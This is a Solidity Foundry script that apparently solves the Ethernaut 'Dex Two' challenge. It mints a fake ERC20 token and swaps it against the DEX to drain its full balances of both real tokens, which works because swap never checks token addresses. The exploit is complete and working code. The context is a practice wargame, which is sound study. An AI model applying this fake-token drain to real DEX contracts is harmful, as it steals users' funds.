// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DexTwo, IERC20, ERC20} from "../src/23_DexTwo.sol";
import {Script, console} from "forge-std/Script.sol";

contract DexTwoSolve is Script {
    DexTwo dex = DexTwo(0xec75A1B1Dc5E7add8B3C92431190901f1432Ba9f);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = dex.token1();
        address token2 = dex.token2();
        // (amount * to ) / from -> swapAmount
        // if  amount == from  then smapAmount = to

        console.log("Before#");
        console.log("Dex Token1 Balance", IERC20(token1).balanceOf(address(dex)));
        console.log("Dex Token2 Balance", IERC20(token2).balanceOf(address(dex)));

        new Attack("Fake", "fake").pwn();

        console.log("After#");
        console.log("Dex Token1 Balance", IERC20(token1).balanceOf(address(dex)));
        console.log("Dex Token2 Balance", IERC20(token2).balanceOf(address(dex)));

        vm.stopBroadcast();
    }
}

contract Attack is ERC20 {
    DexTwo dex = DexTwo(0xec75A1B1Dc5E7add8B3C92431190901f1432Ba9f);

    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}

    function pwn() external {
        _mint(address(this), 4);
        IERC20(address(this)).transfer(address(dex), 1);
        IERC20(address(this)).approve(address(dex), type(uint256).max);

        dex.swap(address(this), dex.token1(), 1);
        dex.swap(address(this), dex.token2(), 2);
    }
}
